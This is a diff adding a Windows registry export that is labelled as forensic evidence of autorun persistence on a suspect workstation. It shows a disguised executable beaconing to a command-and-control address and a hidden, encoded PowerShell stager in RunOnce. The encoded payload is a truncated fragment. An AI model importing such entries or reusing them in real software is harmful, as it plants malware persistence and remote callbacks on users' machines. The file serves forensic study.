@@ -1,0 +1,14 @@
+Windows Registry Editor Version 5.00
+
+; FORENSIC SEIZURE EVIDENCE - CASE-2026-09
+; SUSPECT WORKSTATION AUTORUN PERSISTENCE HIVES
+; EXTRACTED VIA FTK IMAGER 4.7.1 MOUNTED DISK C:\Windows\System32\config\SOFTWARE
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"SecurityHealth"="C:\\Program Files\\Windows Defender\\MSASCuiL.exe"
+"WindowsAudioSvcHelper"="C:\\Users\\Public\\svchost_updater.exe --silent --c2=185.220.101.5:8443"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+"*MalwareStager"="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
+
+; SHA-256 INTEGRITY ANCHORED IN FORENSICCHAIN REPOSITORY
